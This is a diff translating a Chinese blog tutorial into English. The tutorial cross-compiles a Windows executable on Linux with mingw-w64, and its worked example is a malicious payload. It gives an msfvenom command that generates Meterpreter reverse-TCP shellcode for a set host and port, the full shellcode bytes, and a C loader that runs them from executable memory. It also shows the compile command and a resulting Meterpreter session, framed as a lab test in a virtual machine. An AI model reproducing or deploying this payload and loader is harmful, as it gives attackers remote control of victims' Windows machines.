@@ -1,36 +1,34 @@
-# 尝试在 Linux 下编译 exe 可执行文件
+# Attempting to Compile exe Executables on Linux
 
 
-# 序
+<!--more-->
+# Preface
 
-最近一直在想有没有什么办法可以在 Linux 环境下编译 Windows 中可以运行的 exe 文件，由于自己没有 Windows 环境， 就算开虚拟机也多多少少有些不方便..
+I've been thinking recently about whether there's a way to compile Windows executables in a Linux environment. Since I don't have a Windows environment myself, even running a virtual machine is a bit inconvenient...
 
-于是就去谷歌了一下.. 发现办法是有的.
+So I googled it and found that there is a way.
 
-这种办法叫做交叉编译, 要用到交叉编译器
+This method is called cross-compilation, and it requires a cross-compiler.
 
-我们看看维基百科上怎么说
+Let's see what Wikipedia says:
 
->交叉编译器（英语：Cross compiler）是指一个在某个系统平台下可以产生另一个系统平台的可执行文件的编译器。交叉编译器在目标系统平台（开发出来的应用程序序所运行的平台）难以或不容易编译时非常有用。 
+> A cross compiler is a compiler capable of creating executable code for a platform other than the one on which the compiler is running. Cross compiler tools are used to generate executables for embedded systems or multiple platforms.
 >
->交叉编译器的存在对于从一个开发主机为多个平台编译代码是非常有必要的。直接在平台上编译有时行不通，例如在一个嵌入式系统的单片机 ，因为它们没有操作系统，所以直接编译行不通。 
->
->交叉编译器和源代码至源代码编译器不同，交叉编译器用于二进制代码的跨平台软件开发，而源到源编译器是将某种编程语言的程序源代码作为输入，生成以另一种编程语言构成的等效源代码的编译器，但两者都是编程工具。 
->
->rel: https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8
+> rel: https://en.wikipedia.org/wiki/Cross_compiler
 
-概念就是这样..
+That's the concept.
 
 # mingw-w64
-这大概是个交叉编译器了
 
-看看官网怎么说
+This is probably a cross-compiler.
 
-> Mingw-w64 is an advancement of the original mingw.org project, created to support the GCC compiler on Windows systems. It has forked it in 2007 in order to provide support for 64 bits and new APIs. It has since then gained widespread use and distribution. 
+Let's see what the official website says:
+
+> Mingw-w64 is an advancement of the original mingw.org project, created to support the GCC compiler on Windows systems. It has forked it in 2007 in order to provide support for 64 bits and new APIs. It has since then gained widespread use and distribution.
 >
->rel: https://mingw-w64.org/doku.php
+> rel: https://mingw-w64.org/doku.php
 
-好的接下来我们就安装它， 这里 Arch 就直接从 pacman 装上了
+Alright, let's install it. Here on Arch, I'll just install it directly from pacman.
 
 ```text
 $ sudo pacman -S mingw-w64
@@ -39,17 +37,18 @@ $ sudo pacman -S mingw-w64
 ![](/img/2021-04-26-14-32-57屏幕截图.png)
 ![](/img/2021-04-26-14-33-58屏幕截图.png)
 
-# 开始编译
+# Start Compiling
 
-那么， 装完之后就可以开始编译了
+So, after installation, we can start compiling.
 
-我打算编译一个 payload 试试看，嘿嘿
+I'm planning to compile a payload to test it out, hehe.
 
+First, let's use `msfvenom` to generate some shellcode.
 
-首先我们先用 `msfvenom` 生成一段 `shellcode`
 ```txt
 $ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=3333 -f c >> shellcode.c
 ```
+
 ---
 
 ```c
@@ -79,9 +78,10 @@ unsigned char buf[] =
 "\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
 "\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
 ```
+
 ---
 
-然后编写我们的代码
+Then write our code.
 
 ```c
 #include<windows.h>
@@ -114,24 +114,25 @@ unsigned char shellcode[] =
 "\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
 
 void main(){
-    printf("啊哈！你中毒啦！");
+    printf("Aha! You've been infected!");
     //ShellExecute(NULL, _T("open"), _T("explorer.exe"), _T("https://www.baiud.com"), NULL, SW_SHOW);
     LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     memcpy(Memory, shellcode, sizeof(shellcode));
     ((void(*)())Memory)();
 }
 ```
-> PS: 这是抄的(bushi)
 
-接下来进行编译
+> PS: I copied this (just kidding)
+
+Now let's compile it.
 
 ```txt
 $ i686-w64-mingw32-gcc-10.2.0 payload.c -o payload.exe -v
 ```
 
-没有任何报错之后，丢进虚拟机里运行, 如果 meterpreter 能够上线则说明编译是有效的
+After getting no errors, throw it into a virtual machine and run it. If meterpreter comes online, it means the compilation works.
 
-# 检验
+# Verification
 
 ![](/img/2021-05-07-18-18-28屏幕截图.png)
 
@@ -151,10 +152,8 @@ Meterpreter     : x86/windows
 meterpreter > 
 ```
 
-我们直接丢进去跑...
+We just throw it in and run it...
 
-emmm 虽然字乱码了。
+Emmm, the text is garbled though.
 
-不过连接是建立了，那么说明编译是有效的～
-
-
+But the connection was established, so the compilation works~
